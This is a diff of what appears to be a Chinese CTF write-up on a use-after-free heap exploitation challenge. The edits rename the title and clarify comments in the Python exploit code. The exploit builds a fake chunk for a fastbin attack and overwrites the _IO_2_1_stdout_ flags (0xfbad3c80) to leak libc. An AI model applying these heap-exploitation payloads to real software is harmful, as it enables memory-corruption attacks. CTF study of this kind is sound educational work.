@@ -1,4 +1,4 @@
-# Pwn
+# UAF
 
 ## 来源
 
@@ -136,8 +136,9 @@ if __name__ == '__main__':
 ```python 
 	ad(0x20, 'A') # idx 0 为了使用fastbin attack打入unsoted bin-0x10处
 
-	p = 'A' * 0x50 #伪造的堆块,后面要申请到此处来实现修改chunk 2的size和fd
-	p += p64(0) # rev_size
+	p = 'A' * 0x50
+    #伪造的堆块,后面要申请到此处来实现修改chunk 2的size和fd
+	p += p64(0) # prev_size
 	p += p64(0x31) # size
 
 	ad(0x60, p) # idx 1
@@ -218,7 +219,8 @@ pwndbg> x /40gx (long int)&_IO_2_1_stdout_ - 0x43
 
 ```python
 	p = 'A' * 0x33
-	p += p64(0xfbad3c80)
+    # _IO_2_1_stdout_ struct
+	p += p64(0xfbad3c80) # _IO_2_1_stdout_ flag
 	p += p64(0) * 3
 	p += p8(8)
 
